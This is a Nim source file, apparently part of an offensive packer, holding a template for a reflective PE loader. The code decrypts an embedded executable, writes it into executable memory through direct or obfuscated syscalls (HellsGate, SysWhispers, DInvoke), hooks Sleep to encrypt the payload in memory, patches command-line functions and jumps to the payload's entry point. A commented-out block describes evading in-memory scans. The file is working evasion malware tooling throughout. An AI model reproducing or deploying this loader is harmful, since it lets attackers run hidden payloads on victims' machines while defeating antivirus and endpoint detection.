let PELoadStub * = """


    type
        BASE_RELOCATION_ENTRY {.bycopy.} = object
            Offset {.bitsize: 12.}: WORD
            Type {.bitsize: 4.}: WORD


    const
        RELOC_32BIT_FIELD = 3

    when defined(DInvoke):
        let curProc = MyGetCurrentProcessId()
        var curProcHandle: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, curProc)
    else:
        let curProc = GetCurrentProcessId()
        var curProcHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, curProc)

    proc getNtHdrs(pe_buffer: ptr BYTE): ptr BYTE =
        if pe_buffer == nil:
          return nil
        var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
        if idh.e_magic != IMAGE_DOS_SIGNATURE:
          return nil
        let kMaxOffset: LONG = 1024
        var pe_offset: LONG = idh.e_lfanew
        if pe_offset > kMaxOffset:
          return nil
        var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
            cast[ptr BYTE](pe_buffer) + pe_offset))
        if inh.Signature != IMAGE_NT_SIGNATURE:
          return nil
        return cast[ptr BYTE](inh)

    proc getPeDir(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
        if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
          return nil
        var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
        if nt_headers == nil:
          return nil
        var peDir: ptr IMAGE_DATA_DIRECTORY = nil
        var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
        peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
        if peDir.VirtualAddress == 0:
          return nil
        return peDir


    proc applyReloc(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;moduleSize: SIZE_T): bool =
        var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
            IMAGE_DIRECTORY_ENTRY_BASERELOC)
        if relocDir == nil:
          return false
        var maxSize: csize_t = csize_t(relocDir.Size)
        var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
        var reloc: ptr IMAGE_BASE_RELOCATION = nil
        var parsedSize: csize_t = 0
        while parsedSize < maxSize:
          reloc = cast[ptr IMAGE_BASE_RELOCATION]((
              SIZE_T(relocAddr) + SIZE_T(parsedSize) + cast[SIZE_T](modulePtr)))
          if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
            break
          var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
              csize_t(sizeof((BASE_RELOCATION_ENTRY)))
          var page: csize_t = csize_t(reloc.VirtualAddress)
          var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
              cast[SIZE_T](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
          var i: csize_t = 0
          while i < entriesNum:
            var offset: csize_t = entry.Offset
            var entryType: csize_t = entry.Type
            var reloc_field: csize_t = page + offset
            if entry == nil or entryType == 0:
              break
            if entryType != RELOC_32BIT_FIELD:
              return false
            if SIZE_T(reloc_field) >= moduleSize:
              return false
            var relocateAddr: ptr csize_t = cast[ptr csize_t]((
                cast[SIZE_T](modulePtr) + SIZE_T(reloc_field)))
            (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
            entry = cast[ptr BASE_RELOCATION_ENTRY]((
                cast[SIZE_T](entry) + sizeof((BASE_RELOCATION_ENTRY))))
            inc(i)
          inc(parsedSize, reloc.SizeOfBlock)
        return parsedSize != 0

    proc OriginalFirstThunk(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk

    proc fixIAT(modulePtr: PVOID): bool =
        var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
            IMAGE_DIRECTORY_ENTRY_IMPORT)
        if importsDir == nil:
          return false
        var maxSize: csize_t = cast[csize_t](importsDir.Size)
        var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
        var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
        var parsedSize: csize_t = 0
        while parsedSize < maxSize:
          lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
              impAddr + parsedSize + cast[uint64](modulePtr)))
          
          if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
            break
          var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
          var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
          var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
          if thunk_addr == 0:
            thunk_addr = csize_t(lib_desc.FirstThunk)
          var offsetField: csize_t = 0
          var offsetThunk: csize_t = 0
          when defined(DInvoke):
              var hmodule: HMODULE = MyLoadLibraryA(libname)
          else:
              var hmodule: HMODULE = LoadLibraryA(libname)
          when defined(args):
            var commandStr: string
            var exeArgsPassed = false
            if len(arguments) > 0: 
                commandStr = " " & arguments # in case commands are passed we have to prepend at least a space so that argv[1] is the first part of arguments
                exeArgsPassed = true
            if exeArgsPassed:
                # patch _wcmdln and _acmdln if they are present in the import to make arguments working for some C++ binaries
                when defined(DInvoke):
                    var wcmdlenaddr = MyGetProcAddress(hmodule,"_wcmdln")
                else:
                    var wcmdlenaddr = GetProcAddress(hmodule,"_wcmdln") 
                if wcmdlenaddr != nil:
                    when defined(verbose):
                      echo obf("Found _wcmdln -> patching with arguments")
                    var newCmd = newWideCString(commandStr) # we have to prepend 
                    patchMemory(wcmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
                when defined(DInvoke):
                    var acmdlenaddr = MyGetProcAddress(hmodule,"_acmdln")
                else:
                    var acmdlenaddr = GetProcAddress(hmodule,"_acmdln") 
                if acmdlenaddr != nil:
                    when defined(verbose):
                      echo obf("Found _acmdln -> patching with arguments")
                    var newCmd = &(commandStr)
                    patchMemory(acmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
                    
          while true:
            var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
                cast[csize_t](modulePtr) + offsetField + call_via))
            var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
                cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
            var boolvar: bool
            if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
              boolvar = true
            elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
              boolvar = true
            if (boolvar):
              when defined(DInvoke):
                  var libaddr: SIZE_T = cast[SIZE_T](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
              else:
                  var libaddr: SIZE_T = cast[SIZE_T](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
              when defined amd64:
                  fieldThunk.u1.Function = ULONGLONG(libaddr)
              else:
                  fieldThunk.u1.Function = DWORD(libaddr)
            if fieldThunk.u1.Function == 0:
              break
            if fieldThunk.u1.Function == orginThunk.u1.Function:
              var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
              var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
              
        
              var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
              
              let asd = byname.Name

              when defined(DInvoke):
                  var hmodule: HMODULE = MyLoadLibraryA(libname)
                  var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
              else:
                  var hmodule: HMODULE = LoadLibraryA(libname)
                  var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
              
              when defined amd64:
                  fieldThunk.u1.Function = ULONGLONG(libaddr)
              else:
                  fieldThunk.u1.Function = DWORD(libaddr)
              when defined(args):
                # patch common Win32 functions to get the command line
                if exeArgsPassed and "GetCommandLineW" == $$func_name:
                    when defined(verbose):
                      echo obf("[>] Patching function to pass exeArgs: "), func_name
                    patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](newWideCString(commandStr)))
                if exeArgsPassed and $$"GetCommandLineA" == func_name:
                    when defined(verbose):
                      echo obf("[>] Patching function to pass exeArgs: "), func_name
                    patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](&commandStr))
        
            inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
            inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
          inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
        return true

    proc pwndem(): void =
        ptrEncText = cast[ptr byte](addr encText[0])
        ptrDecText = cast[ptr byte](addr decText[0])
        decryptlate()
        var peToLoadPtr: ptr = dectext[0].addr

        var pImageBase: ptr BYTE = nil
        var preferAddr: LPVOID = nil
        var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(peToLoadPtr))
        if (ntHeader == nil):
          when defined(verbose):
            echo obf("[+] File isn't a PE file.")
          quit()

        var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(peToLoadPtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
        preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
        
        when defined(verbose):
          echo $ntHeader.OptionalHeader.SizeOfImage

        when defined(Fluctuate):
            g_fluctuationData.shellcodeAddr = dectext[0].addr
            g_fluctuationData.shellcodeSize = SIZE_T(ntHeader.OptionalHeader.SizeOfImage)
            # Will change the hardcoded key later on
            when defined(amd64):
                g_fluctuationData.encodeKey = 0x1337DE4D
            when defined(i386):
                g_fluctuationData.encodeKey = 0x1337
            g_fluctuationData.currentlyEncrypted = false
            g_fluctuationData.protect = PAGE_READWRITE
            g_fluctuate = FluctuateToRW
            if (hookSleep()):
                when defined(verbose):
                  echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
            else:
                when defined(verbose):
                  echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
        
        var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
        var ds: LPVOID
        var status: NTSTATUS
        when defined(HellsGate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                when defined(verbose):
                  echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
        when defined(SysWhispers):
            status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
        else:
            status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
        
        when defined(verbose):
          echo obf("NtAllocateVirtualMemory:")
          echo status
        
        
        if (preferAddr == nil and relocDir == nil):
          when defined(verbose):
            echo obf("[-] Allocate Image Base At Failure.\n")
          quit()
        when defined amd64:
            ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
        else:
            ntHeader.OptionalHeader.ImageBase = cast[DWORD](preferAddr)
        var bytesWritten: SIZE_T
        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                  echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        when defined(SysWhispers):
            status = oqiazasusjk(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
        else:
            status = NtWriteVirtualMemory(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
        
        when defined(verbose):
          echo obf("NtWriteVirtualMemory:")
          echo status
        
        
        var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[SIZE_T](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
        var i: int = 0
        while i < cast[int](ntHeader.FileHeader.NumberOfSections):
          var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
          var source: LPVOID = (peToLoadPtr + SectionHeaderArr[i].PointerToRawData)
          when defined(SysWhispers):
            status = oqiazasusjk(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
          else:
              status = NtWriteVirtualMemory(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
          when defined(verbose):
            echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
            echo status
          inc(i)
        
        var goodrun = fixIAT(preferAddr)
        
        if preferAddr != preferAddr:
          discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
        var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)


    
        let f = cast[proc(){.nimcall.}](retAddr)
        f()

    #[
        var 
          protectAddress = preferAddr
          op: ULONG
          t: ULONG
        # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
        status =  NtProtectVirtualMemory(curProcHandle,addr protectAddress,addr allocsize,0x01,addr op)
        if (status != 0):
            when defined(verbose):
              echo obf("NtProtectVirtualMemory failed")
              echo status
              echo GetLastError()
        else:
            when defined(verbose):
              echo obf("[*] OldProtect set back")

    ]#


    when defined(GetSyscallStub):
        GetStubs()
    pwndem()


when not defined(lib_only):
    discard main(nil)
when defined(defaultMain):
    discard main(nil)
"""